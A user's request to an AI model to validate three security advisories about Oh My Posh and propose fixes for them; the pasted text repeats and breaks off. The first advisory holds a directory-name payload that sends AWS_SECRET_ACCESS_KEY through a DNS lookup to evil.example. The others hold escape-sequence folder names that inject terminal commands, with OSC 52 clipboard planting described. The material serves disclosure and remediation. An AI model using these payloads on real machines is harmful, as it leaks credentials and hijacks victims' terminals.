content:
I have a few security advisories I want you to analyze, validate, and then also propose fixes. I'm adding all of them because they all relate to similar topics, so maybe we can have one solution for multiple because they seem to have been created by different people. I will share all of them here. Go through each of those, spin up a sub-agent with Fable 5 to do the analysis, and then bring all of the analysis, remediations, and validation back and propose a solution. 

GHSA-f3c9-xqww-j6mf

Description
OMP-001 — SSRF / DNS-based data exfiltration via `getHostByName` left in Oh My Posh's "restricted" template renderer (incomplete fix of [GHSA-6xj8-qv9j-xcjq](https://github.com/advisories/GHSA-6xj8-qv9j-xcjq))
Summary
Oh My Posh renders the current working directory — composed from raw, potentially
attacker-controlled folder names — through the Go `text/template` engine. To close
the arbitrary-command-execution bug [GHSA-6xj8-qv9j-xcjq](https://github.com/advisories/GHSA-6xj8-qv9j-xcjq) (CVE pending), the
maintainer split rendering into `RenderTrusted` (full function map, for config text)
and `RenderUntrusted` (a "restricted" function map, for runtime/attacker-composed
text such as `pt.Path`), and removed `cmd`, `readFile`, `stat`, `glob`, `env` and
`expandenv` from the restricted map (commit `88ddbe0b`, v29.35.1).
The restricted map still exposes `getHostByName` — a `Masterminds/sprig`
function that performs a live DNS resolution (`net.LookupHost`). It is reachable
from the exact untrusted source the RCE fix was protecting (a directory name), and
the same template context exposes environment variables as `.Env.*` data. A
directory whose name encodes a secret into a hostname and calls `getHostByName`
therefore causes the victim's machine to emit a DNS query carrying that secret as
soon as the shell renders the prompt inside (or below) that directory — a blind
SSRF / covert exfiltration channel that the incomplete fix left open.
This is not the patched `cmd` RCE and not a re-report of it: it is a
different, still-live sink (`getHostByName`) on the same attack surface — the
"sibling sink unpatched" incomplete-fix pattern.
Severity
Moderate. CVSS:3.1 5.3 — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N`
Metric-by-metric:

* AV:N (Network): delivery is remote — the malicious directory travels in a
cloned git repository, an extracted archive/tarball, or a mounted network/removable
share. (The base advisory scored the sibling `cmd` bug AV:L; N is chosen here
because the exfiltration channel itself is a network DNS egress and the payload is
network-delivered content. AV:L/score 4.7 is a defensible alternative if the
reviewer scores by the local trigger.)
* AC:L: no special conditions; navigating into the directory suffices.
* PR:N: no privileges or authentication.
* UI:R: the victim must `cd` into (or below) the attacker-named directory and
let the prompt render (the next command after `cd`).
* S:U: the impact stays within Oh My Posh's process authority.
* C:H: environment variables commonly hold high-value secrets (cloud
credentials, API tokens, session cookies); they are exfiltrated verbatim, one
DNS-label-sized chunk per lookup, to attacker-controlled DNS infrastructure.
* I:N / A:N: no integrity or availability impact.

CWE

* CWE-918 Server-Side Request Forgery (attacker-controlled hostname resolution)
* CWE-200 / CWE-201 Exposure of Sensitive Information (env-secret exfiltration)
* Root-cause class: incomplete allow/deny-list of dangerous template functions
(CWE-184 / CWE-1336-adjacent).

Affected component

* Package: `github.com/jandedobbeleer/oh-my-posh`
* `src/template/func_map.go` — `dangerousFuncs` (lines 15-22) and `baseFuncMap()`
(lines 25-64): `baseFuncMap` copies all of `sprig.TxtFuncMap()` except the six
`dangerousFuncs`; `getHostByName` is not among them, so it remains in the
restricted map. `restrictedFuncMap` (line 89-90) = `baseFuncMap()`.
* `src/segments/path.go` — `setStyle()` line 290: `template.RenderUntrusted(pt.Path, pt)`
is the reachable untrusted sink (`pt.Path` is built from raw filesystem folder
names).
* Introduced by the fix commit `88ddbe0b` ("gate cmd/readFile/stat/glob behind
trusted templates"), first released in v29.35.1; present through v29.37.0
(latest at time of writing). Affected range: >= 29.35.1, <= 29.37.0 (i.e. every
release that contains the restricted renderer). The default configuration includes
a `path` segment, so no non-default configuration is required.

Reachability (hop-by-hop, every guard named)

1. Attacker ships a directory named, e.g.
`{{$h:=printf "%s.evil.example" .Env.AWS_SECRET_ACCESS_KEY}}{{getHostByName $h}}`
inside a repo / archive / share. Folder names on Linux/macOS may contain any byte
except `/` and NUL; the payload contains no `/`. Guard: path split on `/` —
defeated, the payload needs no separator.
2. Victim clones/extracts and `cd`s into that directory (or any descendant — the path
segment renders every ancestor component).
3. On prompt render, `Path.setStyle()` builds `pt.Path` from the raw folder names and
calls `template.RenderUntrusted(pt.Path, pt)` (`src/segments/path.go:290`).
Guard: RenderUntrusted uses the restricted func map — this correctly blocks
`cmd`/`readFile`/`stat`/`glob`/`env`/`expandenv` (verified: `{{ env "X" }}` fails
to parse and is echoed literally). It does not block `getHostByName`.
4. `getHostByName` (sprig → `net.LookupHost`) is invoked with the attacker-composed
hostname. Guard: template errors keep the raw string — the lookup is attempted
and the DNS query is emitted before `getHostByName` returns its (possible)
NXDOMAIN error, so exfiltration succeeds even though the rendered prompt falls back
to showing the literal template (making the attack visually stealthy).
5. `.Env.*` template data is available in the untrusted render context (verified:
`{{ .Env.OMP_SECRET }}` → the secret's value), so arbitrary environment secrets
can be encoded into the outbound hostname.

Chain holds end to end with attacker-controlled (not user-config) input.
Root cause
The security of the RCE fix rests on the restricted func map containing no function
with host side effects. The maintainer enumerated six such functions
(`cmd/readFile/stat/glob/env/expandenv`) but missed `getHostByName`, a sprig function
that performs network I/O. Because `baseFuncMap()` merges the entire sprig func map
minus only that explicit blocklist, any side-effecting sprig function not on the list
(here, `getHostByName`) silently remains available to untrusted templates.
Exploit path
attacker-named directory (repo/archive/share) → `env.Pwd()` → `pt.Path` (raw folder
names) → `template.RenderUntrusted(pt.Path, pt)` → restricted func map still contains
`getHostByName` → `net.LookupHost("<secret>.evil.example")` → DNS query carrying the
env secret leaves the victim host → attacker's authoritative DNS records it.
Proof of Concept (executed, benign, fully local)
Built from `src/` with `go build -o /tmp/omp ./`. The PoC uses the reserved
`.invalid` TLD (never resolves, never reaches real infrastructure) and observes the
outbound DNS query with `strace`, so nothing leaves the host to any third party.
Full PoC script (`raw/omp-001-poc.sh`):

```
#!/usr/bin/env bash
set -euo pipefail
OMP=${OMP:-/tmp/omp}
cfg=$(mktemp --suffix=.omp.json)
cat > "$cfg" <<'JSON'
{ "version":3, "blocks":[{"type":"prompt","alignment":"left","segments":[
  {"type":"path","style":"plain","foreground":"#ffffff",
   "template":"{{ .Path }}","properties":{"style":"full"}}]}]}
JSON

# 1) getHostByName executes from a folder name (restricted renderer, default-style config)
"$OMP" print primary --config "$cfg" --shell fish --pwd '/home/v/{{ getHostByName `localhost` }}'

# 2) environment secret is readable as .Env template data in the same context
OMP_SECRET=s3cr3tAWSkey "$OMP" print primary --config "$cfg" --shell fish --pwd '/home/v/{{ .Env.OMP_SECRET }}'

# 3) end-to-end exfil: secret encoded into a DNS query, observed leaving the process
SEC=EXFILtestMARKER42
OMP_SECRET=$SEC strace -f -e trace=write,sendto,sendmmsg -s 400 \
  "$OMP" print primary --config "$cfg" --shell fish \
  --pwd "/home/v/{{ \$h := printf \"%s.exfil.invalid\" .Env.OMP_SECRET }}{{ getHostByName \$h }}" \
  2>&1 >/dev/null | grep -a "$SEC" | head -2
rm -f "$cfg"
```

Observed output:

```
### 1) getHostByName executes from a folder name
/home/v/127.0.0.1                # the folder-name template resolved to the looked-up IP: the func RAN

### 2) environment secret is readable as .Env template data
/home/v/s3cr3tAWSkey            # secret available to encode into a hostname

### 3) end-to-end exfil: secret in the outbound DNS query
write(3, "L#\1 \0\1\0\0\0\0\0\1\21EXFILtestMARKER42\5exfil\7invalid\0\0\1\0\1...", 60) = 60
write(6, "\257\204\1 \0\1\0\0\0\0\0\1\21EXFILtestMARKER42\5exfil\7invalid\0\0\34\0\1...", 60) = 60

```

The DNS wire-format `\21EXFILtestMARKER42\5exfil\7invalid` is a query for
`EXFILtestMARKER42.exfil.invalid` where `EXFILtestMARKER42` is the value of
`$OMP_SECRET` read via `.Env` — the secret is exfiltrated in a DNS lookup triggered
solely by the directory name.
Adversarial re-read (what I tried in order to refute it)

* "Path splitting on `/` blocks the payload." The payload contains no `/`;
confirmed it executes from a `--pwd` value (which is exactly `env.Pwd()` for a real
directory of that name).
* "getHostByName errors on a non-existent name, so nothing happens." strace shows
the DNS query is emitted before the lookup fails; the exfil channel is the query,
not the return value. The prompt showing the raw template only makes it stealthier.
* "`.Env` isn't populated in real use." Oh My Posh runs with the invoking shell's
full environment; `.Env.OMP_SECRET` resolved to its value in testing.
* "This is just GHSA-6xj8." No: that was `cmd` RCE via the full/trusted func map;
the fix removed `cmd`/`readFile`/`stat`/`glob`/`env`/`expandenv` from the untrusted
map. `getHostByName` is a different, network-side-effecting function the blocklist
missed — a distinct sink (SSRF/exfil, CWE-918/200) on the same source. Confirmed
`env`/`expandenv` are gone (echoed literally) while `getHostByName` still fires.
* "Only a beacon, no data." `.Env.*` (and other prompt context) can be encoded
into the hostname, so real secret values are exfiltrated, not just a hit signal.

Result: the finding survives. CONFIRMED.
Remediation

* Add `getHostByName` to `dangerousFuncs` in `src/template/func_map.go` (it performs
network I/O and has no place in a renderer meant for untrusted data).
* Prefer an allowlist over a blocklist for the restricted map: build
`restrictedFuncMap` from an explicit set of pure/side-effect-free functions instead
of "all of sprig minus six names", so a future side-effecting sprig function cannot
silently reappear on the untrusted path (the same class of regression the
trusted/untrusted split was designed to prevent).
* Optionally, do not expose `.Env` as template data to `RenderUntrusted`, so
untrusted templates cannot read the process environment even through
non-`env`/`expandenv` code paths.

Confidence
High — mechanism confirmed by code (`baseFuncMap` omits `getHostByName` from the
blocklist), reachability confirmed by the current untrusted sink (`path.go:290`), and
end-to-end exfiltration confirmed empirically (strace-captured DNS query carrying the
env secret).
Proof-of-Concept source (`omp-001-poc.sh`)

```
#!/usr/bin/env bash
# OMP-001 PoC — SSRF / DNS-exfiltration via getHostByName in oh-my-posh's
# "restricted" (untrusted) template renderer, reachable from an attacker-controlled
# directory name. Incomplete fix of GHSA-6xj8-qv9j-xcjq.
#
# All observation is LOCAL: the payload hostname uses the reserved `.invalid` TLD
# (never resolves, never reaches real infrastructure). We use strace to observe the
# DNS query bytes leaving the oh-my-posh process — that is the exfiltration channel.
#
# Build:  cd oh-my-posh/src && go build -o /tmp/omp ./
set -euo pipefail
OMP=${OMP:-/tmp/omp}

cfg=$(mktemp --suffix=.omp.json)
cat > "$cfg" <<'JSON'
{ "version":3, "blocks":[{"type":"prompt","alignment":"left","segments":[
  {"type":"path","style":"plain","foreground":"#ffffff",
   "template":"{{ .Path }}","properties":{"style":"full"}}]}]}
JSON

echo "### 1) getHostByName executes from a folder name (restricted renderer, no config needed)"
"$OMP" print primary --config "$cfg" --shell fish --pwd '/home/v/{{ getHostByName `localhost` }}'
echo; echo "   -> folder-name template resolved to the looked-up IP (127.0.0.1): the func RAN."

echo; echo "### 2) environment secret is readable as .Env template data in the same context"
OMP_SECRET=s3cr3tAWSkey "$OMP" print primary --config "$cfg" --shell fish --pwd '/home/v/{{ .Env.OMP_SECRET }}'
echo; echo "   -> the secret is available to encode into a hostname."

echo; echo "### 3) end-to-end exfil: secret encoded into a DNS query, observed leaving the process"
SEC=EXFILtestMARKER42
OMP_SECRET=$SEC strace -f -e trace=write,sendto,sendmmsg -s 400 \
  "$OMP" print primary --config "$cfg" --shell fish \
  --pwd "/home/v/{{ \$h := printf \"%s.exfil.invalid\" .Env.OMP_SECRET }}{{ getHostByName \$h }}" \
  2>&1 >/dev/null | grep -a "$SEC" | head -2
echo "   -> DNS query wire-format contains \\21${SEC}\\5exfil\\7invalid: the env secret was"
echo "      exfiltrated in a DNS lookup, triggered solely by the directory name."
rm -f "$cfg"

GHSA-qpfq-pw86-rv68

OMP-002 — Terminal escape-sequence injection via the OSC working-directory integration (pwd), from an attacker-controlled directory name (incomplete fix of GHSA-fwjx-9p69-h25h)
Summary
GHSA-fwjx-9p69-h25h (Medium, CWE-150) reported that Oh My Posh emitted
attacker-controlled segment data (directory names, git metadata, …) to the terminal
without neutralizing raw control characters, allowing ANSI/OSC escape-sequence
injection. The fix (commit edcf3c88, v29.35.1) added an isControlRune check to
write(s rune) in src/terminal/writer.go, which strips C0/C1 control runes from
segment body content as it is written rune-by-rune.

That fix is incomplete. It only guards the per-rune segment-body path. The
OSC working-directory integration (terminal.Pwd, src/terminal/writer.go:254),
reached from Engine.pwd() (src/prompt/engine.go:144), emits the raw current
directory path into an OSC 7 / OSC 9;9 / OSC 51 escape sequence via fmt.Sprintf
with no control-rune filtering, and writes the whole string to the output buffer
directly (not through the guarded write(s rune)). A directory name containing the
ST byte pair (ESC \, 0x1b 0x5c) or BEL (0x07) therefore closes the OSC
prematurely and lets a following attacker-crafted escape sequence stand on its own —
exactly the impact the advisory said it fixed ("OSC 52 clipboard writes … via a
malicious directory name"). The iTerm feature path (RenderItermFeatures,
src/terminal/iterm.go, OSC 1337) is the same unfiltered pattern for pwd/user/host.

This is a genuine unpatched sibling sink, not a re-report of the fixed
segment-body path.

Severity
Moderate — CONDITIONAL on the pwd (or iterm_features) configuration option
being enabled. CVSS:3.1 6.1 — AV:L/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L
(identical vector to the base advisory GHSA-fwjx-9p69-h25h, since the impact class is
the same).

Metric-by-metric:

AV:L / AC:L / PR:N / UI:R: the malicious directory is delivered via a repo
checkout, extracted archive, or shared/removable mount; the victim triggers it by
navigating into it (or a descendant — the pwd is the full path) and rendering the
prompt. No auth, no special conditions.
S:C: the injected escape sequence is interpreted by the terminal emulator (a
component beyond Oh My Posh), so scope changes — matching the base advisory.
C:L / I:L / A:L: depending on the emulator, an injected OSC enables clipboard
hijacking (OSC 52 — writing a command into the clipboard so it runs when the victim
pastes), window-title / prompt spoofing, and terminal denial of service.
Precondition (CONDITIONAL): the config must set pwd to osc7, osc99, or
osc51 (terminal working-directory reporting), or enable the iTerm current_dir /
remote_host feature. This is not in the default configuration but is a common,
documented opt-in — terminals such as VS Code, WezTerm, Kitty and others use OSC 7 to
open new tabs/splits in the current directory, and Oh My Posh documents pwd for
this purpose. The base advisory's other vectors (segment body) were default-config;
this sibling requires the integration to be on.

CWE
CWE-150 Improper Neutralization of Escape, Meta, or Control Sequences (same as
the base advisory).
Affected component
Package: github.com/jandedobbeleer/oh-my-posh
src/terminal/writer.go:254 Pwd() — fmt.Sprintf(formats.Osc7, hostName, pwd)
(and Osc51, Osc99) embed the raw pwd with no filtering.
src/prompt/engine.go:126-144 Engine.pwd() — pwd := e.Env.Pwd(); only Cygwin
(\→/) and WSL path transforms are applied, then e.write(terminal.Pwd(...))
writes the whole OSC string directly to the builder (bypassing the per-rune
isControlRune filter added by edcf3c88).
src/terminal/iterm.go RenderItermFeatures — OSC 1337 CurrentDir/RemoteHost,
same unfiltered pattern (gated on iterm_features).
Fix commit edcf3c88 (v29.35.1) did not touch these paths. Affected: the released
fix through v29.37.0 (latest). Because the OSC-pwd emission predates the fix,
the vulnerable range for this vector is effectively all releases with the pwd
feature, and specifically every release the escape-strip fix claims to protect
(>= 29.35.1, <= 29.37.0).
Reachability (hop-by-hop, every guard named)
Attacker creates a directory whose name contains
evil + ESC \ (ST) + ESC ] 0 ; <payload> BEL (an independent OSC sequence) and
ships it in a repo / archive / share. Directory components on Linux/macOS may
contain any byte except / and NUL, including 0x1b, 0x5c, 0x07. Guard:
none on directory-name bytes.
Victim cds into the directory (or a descendant); the shell invokes
oh-my-posh print primary --pwd "$PWD" with the raw bytes.
Engine.pwd() reads pwd := e.Env.Pwd(). Guards: IsCygwin \→/, IsWsl
Windows-path convert — neither removes control runes (verified engine.go:126-140).
Guard: e.Config.PWD must be non-empty and RenderTrusted(e.Config.PWD) must
yield a non-empty type (engine.go:132-135) — this is the CONDITIONAL gate (pwd
config = osc7/osc99/osc51). Defeated when the integration is enabled.
terminal.Pwd(pwdType, user, host, pwd) (writer.go:254) → fmt.Sprintf(Osc7, host, pwd) with the raw pwd; e.write(...) appends the whole string to the builder.
Guard: isControlRune in write(s rune) — NOT on this path (it filters only
the per-rune segment-body loop). Defeated: the raw ESC/ST/BEL survive.
Chain holds end to end with attacker-controlled (not user-config) input, given the
pwd integration is enabled.

Root cause
The escape-injection fix neutralized control runes at one sink (write(s rune),
segment body) but the same attacker source (the directory name — named explicitly in
the fix commit message) reaches the terminal through a second, unguarded sink
(terminal.Pwd OSC emission, and iTerm OSC 1337). Neutralization was applied at the
sink rather than at the source, so any sink the author did not enumerate remains
vulnerable.

Exploit path
attacker-named directory → env.Pwd() → Engine.pwd() (no control-rune filter) →
terminal.Pwd → fmt.Sprintf(OSC7/99/51, …, rawPwd) → e.write(wholeString) →
terminal interprets the attacker's injected OSC 52 / OSC 0 / … sequence.

Proof of Concept (executed, benign, fully local)
Built from src/ with go build -o /tmp/omp ./. Output is piped to cat -v, so no
live terminal interprets the bytes; the injected escape is a benign OSC 0 window-title
set to the marker OMPPWN (no clipboard write, nothing persistent/destructive).

Full PoC (raw/omp-002-poc.sh):

#!/usr/bin/env bash
set -euo pipefail
OMP=${OMP:-/tmp/omp}
# 'evil' + ESC '\' (ST closes the OSC) + independent OSC 0 title-set to benign marker + BEL + 'rest'
INJ=$(printf 'evil\033\134\033]0;OMPPWN\007rest')
for mode in osc7 osc99 osc51; do
  cfg=$(mktemp --suffix=.omp.json)
  cat > "$cfg" <<JSON
{ "version":3, "pwd":"$mode", "blocks":[{"type":"prompt","alignment":"left","segments":[
  {"type":"text","style":"plain","foreground":"#ffffff","template":"X"}]}]}
JSON
  echo "### pwd:$mode"
  "$OMP" print primary --config "$cfg" --shell fish --pwd "$INJ" | cat -v
  rm -f "$cfg"
done
Observed output (^[ = ESC, ^G = BEL):

### pwd:osc7
^[[38;2;255;255;255mX^[[0m^[]7;file://aoc/evil^[\^[]0;OMPPWN^Grest^[\
### pwd:osc99
^[[38;2;255;255;255mX^[[0m^[]9;9;evil^[\^[]0;OMPPWN^Grest^[\
### pwd:osc51
^[[38;2;255;255;255mX^[[0m^[]51;Aaoc@aoc:evil^[\^[]0;OMPPWN^Grest^[\
In each case Oh My Posh's own working-dir OSC (]7; / ]9;9; / ]51;) is closed
prematurely by the attacker's ^[\ (ST), immediately followed by an intact,
independent ^[]0;OMPPWN^G (set-window-title to OMPPWN) that came straight from the
directory name — the raw control bytes were not filtered. Substituting
]52;c;<base64> for ]0;OMPPWN yields the OSC 52 clipboard-write the base advisory
describes.

Adversarial re-read (what I tried in order to refute it)
"Duplicate of GHSA-fwjx." No: that fix strips control runes in write(s rune)
for segment body content; verified (vein A) that the segment-body and hyperlink
paths and the console title (trimAnsi) are now safe. The terminal.Pwd OSC
emission is a separate sink the fix never touched, carrying the same source.
"CONDITIONAL — is the pwd integration realistic?" Confirmed pwd is not in
the default config, so it is genuinely CONDITIONAL — but OSC 7 working-directory
reporting is a widely used, documented opt-in for terminal tab/split integration.
Reported as CONDITIONAL/Moderate accordingly.
"Does the raw byte really reach the OSC?" Reproduced empirically for all three
modes (osc7/osc99/osc51): the injected ESC \ and ESC ] 0 ; … BEL appear verbatim
in the emitted OSC region.
"Are directory names with ESC bytes feasible?" Yes — Linux/macOS allow any byte
except /, NUL; this is the same premise the base advisory already accepted.
Result: the finding survives as a CONDITIONAL incomplete-fix.

Remediation
Neutralize control runes in the pwd/user/host values before they are formatted
into any OSC sequence in terminal.Pwd and RenderItermFeatures — e.g. reuse
trimAnsi/isControlRune on pwd (and userName/hostName) in
src/prompt/engine.go:pwd() before calling terminal.Pwd, and likewise for the
iTerm feature emission.
More robustly, neutralize at the source: sanitize e.Env.Pwd(), git metadata, env
values and command output once, centrally, rather than at each individual terminal
sink, so a future sink cannot reintroduce the gap.
Confidence
High on the mechanism and reachability (confirmed by code and by empirical
reproduction of all three OSC modes); the CONDITIONAL precondition (pwd
integration enabled) is explicitly stated and reflected in the severity.

Proof-of-Concept source (omp-002-poc.sh)
#!/usr/bin/env bash
# OMP-002 PoC — terminal escape-sequence injection via the OSC working-directory
# integration (pwd: osc7|osc99|osc51), from an attacker-controlled directory name.
# Incomplete fix of GHSA-fwjx-9p69-h25h (commit edcf3c88 only filtered write(s rune)
# for SEGMENT body text; the terminal.Pwd OSC emission was left unfiltered).
#
# SAFE: output is piped to `cat -v` / `xxd`, so no live terminal interprets the
# bytes. The injected escape is a benign OSC 0 window-title set to the marker
# "OMPPWN" (no clipboard write, no persistent/destructive effect).
#
# Build:  cd oh-my-posh/src && go build -o /tmp/omp ./
set -euo pipefail
OMP=${OMP:-/tmp/omp}

# Attacker directory name: 'evil' + ESC '\' (ST, closes the OSC prematurely)
# + an independent OSC 0 title-set to a benign marker + BEL + 'rest'.
INJ=$(printf 'evil\033\134\033]0;OMPPWN\007rest')

for mode in osc7 osc99 osc51; do
  cfg=$(mktemp --suffix=.omp.json)
  cat > "$cfg" <<JSON
{ "version":3, "pwd":"$mode", "blocks":[{"type":"prompt","alignment":"left","segments":[
  {"type":"text","style":"plain","foreground":"#ffffff","template":"X"}]}]}
JSON
  echo "### pwd:$mode  (directory name carries ESC/ST/OSC bytes)"
  "$OMP" print primary --config "$cfg" --shell fish --pwd "$INJ" | cat -v
  echo
  rm -f "$cfg"
done
echo "Each line shows the OMP working-dir OSC (]7;/]9;9;/]51;) closed early by the"
echo "attacker's ^[\\ (ST), followed by an intact injected ^[]0;OMPPWN^G title-set —"
echo "proving raw control bytes from the directory name pass through unfiltered."

GHSA-j594-rcfg-hcvw

Description
Target: github.com/JanDeDobbeleer/oh-my-posh
Affected resource: terminal.Pwd() (src/terminal/writer.go) and RenderItermFeatures (src/terminal/iterm.go) — both emit the raw current working directory into an OSC control sequence without stripping control runes. Verified on v29.37.0 (latest stable, 2026-07-28, HEAD 9796746); the Pwd sink (writer.go L254-267) and RenderItermFeatures (iterm.go L44) are byte-identical to v29.36.0, where they were first documented — the code links below pin the v29.36.0 tag.
Severity: Medium (~5.2 CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:L)
Weakness: CWE-150 (Improper Neutralization of Escape, Meta, or Control Sequences) — incomplete fix of GHSA-fwjx-9p69-h25h

Summary
GHSA-fwjx-9p69-h25h (fixed in 29.35.1) neutralized terminal escape injection from attacker-controlled segment content — a malicious directory name or git commit subject — by stripping C0/C1 control runes inside write(s rune), the single sink through which segment content flows to the terminal.

Two other code paths write the raw current working directory to the terminal without going through write(s rune), so they still emit unfiltered escape bytes from a folder name:

the pwd option's cwd report (terminal.Pwd() — OSC 7 / OSC 9;9 / OSC 51), and
the iterm_features: ["current_dir"] cwd report (RenderItermFeatures — OSC 1337).
A directory whose name contains ESC/OSC/BEL bytes (all legal in POSIX filenames) is emitted verbatim inside the OSC sequence. When the victim cds into it and the prompt renders, the injected escape sequence executes — the exact class GHSA-fwjx-9p69-h25h set out to prevent, via sinks the fix did not cover.

Root Cause
The 29.35.1 escape fix (edcf3c88) added isControlRune filtering inside write(s rune) and touched only writer.go. Its own comment notes write is "the only sink Oh My Posh's own styling never uses" — i.e. it filters segment content but not code paths that emit OMP's own escape sequences. Two of those latter paths interpolate the raw cwd:

1. terminal.Pwd() — src/terminal/writer.go L254-L269:

func Pwd(pwdType, userName, hostName, pwd string) string {
	if Plain {
		return ""
	}
	switch pwdType {
	case OSC7:
		return fmt.Sprintf(formats.Osc7, hostName, pwd)   // ESC]7;file://<host>/<pwd>ESC\
	case OSC51:
		return fmt.Sprintf(formats.Osc51, userName, hostName, pwd)
	case OSC99:
		fallthrough
	default:
		return fmt.Sprintf(formats.Osc99, pwd)
	}
}
pwd is interpolated with no sanitization. The format (src/shell/formats.go L97) is "\x1b]7;file://%s/%s\x1b\\", terminated by ST (ESC \). The caller passes the raw cwd — src/prompt/engine.go L126-L144: pwd := e.Env.Pwd() … e.write(terminal.Pwd(pwdType, user, host, pwd)) — and e.write is a plain WriteString, so the OSC bytes reach the terminal unmodified. A folder name containing ESC \ closes the OSC 7 early; any following bytes are then interpreted as fresh terminal input.

2. RenderItermFeatures CurrentDir — src/terminal/iterm.go L44: fmt.Sprintf(formats.ITermCurrentDir, pwd) = "\x1b]1337;CurrentDir=%s\x07" (BEL-terminated), same raw cwd via primary.go L154.

By contrast FormatTitle (console-title OSC 2) does run trimAnsi + per-character escaping — so the fix's authors sanitized the title path but not these two cwd-report paths.

Steps to Reproduce
Prerequisites
A POSIX shell (bash or zsh), curl, python3
oh-my-posh v29.37.0 release binary (downloaded in Step 1)
Step 1: Install oh-my-posh at the latest release
mkdir -p /tmp/omp-osc-poc && cd /tmp/omp-osc-poc
OS=$(uname -s | tr '[:upper:]' '[:lower:]')
ARCH=$(uname -m); [ "$ARCH" = "x86_64" ] && ARCH=amd64
curl -L -o ./oh-my-posh "https://github.com/JanDeDobbeleer/oh-my-posh/releases/download/v29.37.0/posh-${OS}-${ARCH}"
chmod +x ./oh-my-posh
./oh-my-posh version
Step 2: Minimal config enabling the OSC 7 cwd report plus a path segment
cd /tmp/omp-osc-poc
cat > cfg.json <<'EOF'
{
  "$schema": "https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/main/themes/schema.json",
  "version": 3,
  "pwd": "osc7",
  "blocks": [
    { "type": "prompt", "alignment": "left",
      "segments": [ { "type": "path", "style": "plain", "template": "[{{ .Path }}]" } ] }
  ]
}
EOF
Step 3: Create an attacker-named directory, render the prompt inside it, and compare sinks
The folder name embeds a break-out (ESC \ = OSC terminator) followed by a set-window-title sequence (ESC ] 0 ; OMP_ESC_INJECTED BEL) — a harmless sentinel payload.

cd /tmp/omp-osc-poc
EVIL=$(printf 'proj\x1b\\\x1b]0;OMP_ESC_INJECTED\x07')
mkdir -p ./repo && ( cd ./repo && mkdir -- "$EVIL" )
( cd -- "/tmp/omp-osc-poc/repo/$EVIL" && /tmp/omp-osc-poc/oh-my-posh print primary --config /tmp/omp-osc-poc/cfg.json --shell bash ) > prompt.bin
od -c prompt.bin
python3 - <<'PY'
data = open("prompt.bin","rb").read()
inj = b"\x1b]0;OMP_ESC_INJECTED\x07"
osc7 = data.find(b"\x1b]7;")
path_seg   = data[:osc7] if osc7 != -1 else data
pwd_report = data[osc7:] if osc7 != -1 else b""
print("injected title-set seq in PATH segment (patched sink):  ", inj in path_seg)
print("injected title-set seq in OSC7 pwd report (this sink):  ", inj in pwd_report)
print("RESULT:", "ESCAPE INJECTION CONFIRMED via OSC7 pwd report" if (inj in pwd_report and inj not in path_seg) else "not reproduced")
PY
Expected output (the python3 assertion, after the od -c dump):

injected title-set seq in PATH segment (patched sink):   False
injected title-set seq in OSC7 pwd report (this sink):   True
RESULT: ESCAPE INJECTION CONFIRMED via OSC7 pwd report
od -c prompt.bin shows the OSC 7 region carrying the raw folder-name bytes (the file:// authority holds the local hostname, redacted below as <host>):

033   ]   7   ;   f   i   l   e   :   /   /  <host>   /   /   t   m   p
/   o   m   p   -   o   s   c   -   p   o   c   /   r   e   p   o   /   p
r   o   j 033   \ 033   ]   0   ;   O   M   P   _   E   S   C   _   I   N
J   E   C   T   E   D  \a 033   \   \   \   ]
The injected ESC ] 0 ; OMP_ESC_INJECTED BEL sits intact inside the cwd report. The identical folder name is stripped to inert text in the path segment (the sink edcf3c88 patched), so the injected sequence is absent there — the difference between the two is the incomplete fix. Rendering this prompt in a real terminal sets the window title to OMP_ESC_INJECTED.

The same result holds for pwd: osc99 / osc51, and for iterm_features: ["current_dir"] (OSC 1337, when TERM_PROGRAM=iTerm.app).

Suggested Fix
Route the cwd through the same control-rune filter the segment path already uses before interpolating it into any OSC sequence — strip isControlRune bytes from pwd (and from any other externally-derived value) in terminal.Pwd() and RenderItermFeatures, or percent-encode the path per the OSC 7 file:// URI spec (which also fixes literal spaces). The console-title path's trimAnsi is the existing precedent. (Advisory only.)

Cleanup
rm -rf /tmp/omp-osc-poc
Impact
A developer who clones a repository, extracts an archive, or opens a directory whose name contains terminal escape bytes — the same delivery vector as GHSA-fwjx-9p69-h25h — has arbitrary terminal escape sequences injected into their prompt when they cd into it, provided their config enables the pwd cwd report (osc7/osc99/osc51) or iterm_features: ["current_dir"]. These are documented options for terminal working-directory reporting and split-pane cwd inheritance (WezTerm, kitty, iTerm2), so the precondition is a real, non-default config rather than the default path segment the parent advisory covered — reflected in the AC:H score. The injected sequences enable window-title / prompt spoofing, OSC 52 clipboard overwrite (planting a command for the victim to paste), and terminal denial of service via malformed sequences — the impact set GHSA-fwjx-9p69-h25h enumerates, reached through the two cwd-report sinks its fix did not filter.
GHSA-xhgr-25r7-c3fm

```

I have a few security advisories I want you to analyze, validate, and then also propose fixes. I'm adding all of them because they all relate to similar topics, so maybe we can have one solution for multiple because they seem to have been created by different people. I will share all of them here. Go through each of those, spin up a sub-agent with Fable 5 to do the analysis, and then bring all of the analysis, remediations, and validation back and propose a solution. 

GHSA-f3c9-xqww-j6mf

Description
OMP-001 — SSRF / DNS-based data exfiltration via `getHostByName` left in Oh My Posh's "restricted" template renderer (incomplete fix of [GHSA-6xj8-qv9j-xcjq](https://github.com/advisories/GHSA-6xj8-qv9j-xcjq))
Summary
Oh My Posh renders the current working directory — composed from raw, potentially
attacker-controlled folder names — through the Go `text/template` engine. To close
the arbitrary-command-execution bug [GHSA-6xj8-qv9j-xcjq](https://github.com/advisories/GHSA-6xj8-qv9j-xcjq) (CVE pending), the
maintainer split rendering into `RenderTrusted` (full function map, for config text)
and `RenderUntrusted` (a "restricted" function map, for runtime/attacker-composed
text such as `pt.Path`), and removed `cmd`, `readFile`, `stat`, `glob`, `env` and
`expandenv` from the restricted map (commit `88ddbe0b`, v29.35.1).
The restricted map still exposes `getHostByName` — a `Masterminds/sprig`
function that performs a live DNS resolution (`net.LookupHost`). It is reachable
from the exact untrusted source the RCE fix was protecting (a directory name), and
the same template context exposes environment variables as `.Env.*` data. A
directory whose name encodes a secret into a hostname and calls `getHostByName`
therefore causes the victim's machine to emit a DNS query carrying that secret as
soon as the shell renders the prompt inside (or below) that directory — a blind
SSRF / covert exfiltration channel that the incomplete fix left open.
This is not the patched `cmd` RCE and not a re-report of it: it is a
different, still-live sink (`getHostByName`) on the same attack surface — the
